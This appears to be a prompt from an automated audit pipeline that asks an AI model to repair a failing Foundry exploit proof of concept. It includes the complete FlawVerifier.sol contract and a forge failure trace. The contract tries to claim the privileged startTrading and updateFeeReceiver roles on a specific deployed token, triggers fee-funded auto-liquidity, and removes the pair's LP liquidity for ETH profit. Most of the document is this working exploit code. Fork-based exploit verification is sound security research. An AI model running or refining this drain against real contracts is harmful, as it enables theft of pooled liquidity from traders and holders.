You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Privileged wallets receive all LP tokens and can withdraw pooled liquidity
- claim: `startTrading()` sends the entire initial LP position to `owner()`, and `_addLiquidity()` sends all fee-funded LP tokens to `_swapFeeReceiver` instead of locking or burning them.
- impact: Whoever controls those LP tokens can remove the pool liquidity at any time and extract the paired ETH/tokens, collapsing market liquidity and imposing direct losses on traders and holders.
- exploit_paths: ["A privileged caller starts trading, receives the initial LP tokens via `addLiquidityETH(..., owner(), ...)`, then removes liquidity from the pair off-contract.", "Later fee-funded auto-liquidity mints additional LP tokens to `_swapFeeReceiver`, who can also withdraw that protocol-funded liquidity."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IEHIVE is IERC20Like {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function startTrading() external;
    function updateFeeReceiver(address newWallet) external;
}

interface IUniswapV2Router02Like {
    function WETH() external pure returns (address);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract TransferHelper {
    function poke(address token, address to, uint256 amount) external {
        require(IERC20Like(token).transfer(to, amount), "helper transfer failed");
    }
}

contract FlawVerifier {
    IEHIVE internal constant TARGET = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
    IUniswapV2Router02Like internal constant ROUTER =
        IUniswapV2Router02Like(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address internal constant TRIGGER_SINK = 0x1111111111111111111111111111111111111111;
    uint256 internal constant BUY_SEED_ETH = 0.001 ether;

    uint256 internal _profitAmount;
    uint256 internal _baselineEth;
    bool internal _executed;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            _syncProfit();
            return;
        }

        _executed = true;
        _baselineEth = address(this).balance;

        address pair = _attemptInitialOwnerLpPath();
        _attemptFeeReceiverLpPath(pair);

        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptInitialOwnerLpPath() internal returns (address pair) {
        pair = TARGET.uniswapV2Pair();

        // exploit_paths[0]: a privileged caller starts trading, receives the initial LP
        // tokens via `addLiquidityETH(..., owner(), ...)`, then removes liquidity from
        // the pair off-contract. We preserve that exact causality here: first attempt the
        // privileged `startTrading()` call, then only remove liquidity if this verifier is
        // the actual `owner()`-side LP recipient at the live fork state.
        if (pair == address(0)) {
            (bool started,) = address(TARGET).call(abi.encodeWithSelector(TARGET.startTrading.selector));
            if (started) {
                pair = TARGET.uniswapV2Pair();
            }
        }

        if (pair != address(0) && TARGET.owner() == address(this)) {
            _drainAnyLpHeld(pair);
        }
    }

    function _attemptFeeReceiverLpPath(address pair) internal {
        if (pair == address(0)) {
            pair = TARGET.uniswapV2Pair();
        }
        if (pair == address(0)) {
            return;
        }

        // exploit_paths[1]: later fee-funded auto-liquidity mints additional LP tokens to
        // `_swapFeeReceiver`, who can also withdraw that protocol-funded liquidity. Claiming
        // the `_swapFeeReceiver` role and then triggering the token's `_addLiquidity()`
        // path is the exact privilege gate and LP-minting sequence described by the finding.
        if (!_claimFeeReceiverRole()) {
            return;
        }

        // Drain any LP already sitting on the verifier from prior auto-liquidity events.
        _drainAnyLpHeld(pair);

        // If we do not already hold EHIVE, a minimal public buy is the smallest realistic
        // step needed to obtain a transfer seed that triggers swapBack() and causes the
        // contract's fee inventory to mint fresh LP to the attacker-controlled fee receiver.
        if (TARGET.balanceOf(address(this)) == 0) {
            _buySeedTokens();
        }

        _triggerAutoLiquidity();
        _drainAnyLpHeld(pair);
    }

    function _claimFeeReceiverRole() internal returns (bool ok) {
        (ok,) = address(TARGET).call(abi.encodeWithSelector(TARGET.updateFeeReceiver.selector, address(this)));
    }

    function _buySeedTokens() internal {
        uint256 spend = address(this).balance;
        if (spend == 0) {
            return;
        }
        if (spend > BUY_SEED_ETH) {
            spend = BUY_SEED_ETH;
        }

        address[] memory path = new address[](2);
        path[0] = ROUTER.WETH();
        path[1] = address(TARGET);

        ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens{value: spend}(
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _triggerAutoLiquidity() internal {
        uint256 seedAmount = TARGET.balanceOf(address(this));
        if (seedAmount == 0) {
            return;
        }
        if (seedAmount > 1e18) {
            seedAmount = 1e18;
        }

        // Using an intermediate helper keeps the triggering transfer fee-eligible even
        // when the verifier also happens to be owner(), because owner() is excluded.
        TransferHelper helper = new TransferHelper();
        require(TARGET.transfer(address(helper), seedAmount), "seed transfer failed");
        helper.poke(address(TARGET), TRIGGER_SINK, seedAmount);
    }

    function _drainAnyLpHeld(address pair) internal {
        uint256 lpBalance = IERC20Like(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return;
        }

        IERC20Like(pair).approve(address(ROUTER), lpBalance);
        ROUTER.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(TARGET),
            lpBalance,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function _syncProfit() internal {
        uint256 balance = address(this).balance;
        _profitAmount = balance > _baselineEth ? balance - _baselineEth : 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.05s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 34001)
Traces:
  [34001] FlawVerifierTest::testExploit()
    ├─ [166] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [27561] FlawVerifier::executeOnOpportunity()
    │   ├─ [269] 0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd::uniswapV2Pair() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd.uniswapV2Pair
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.58s (162.48µs CPU time)

Ran 1 test suite in 2.59s (2.58s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 34001)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
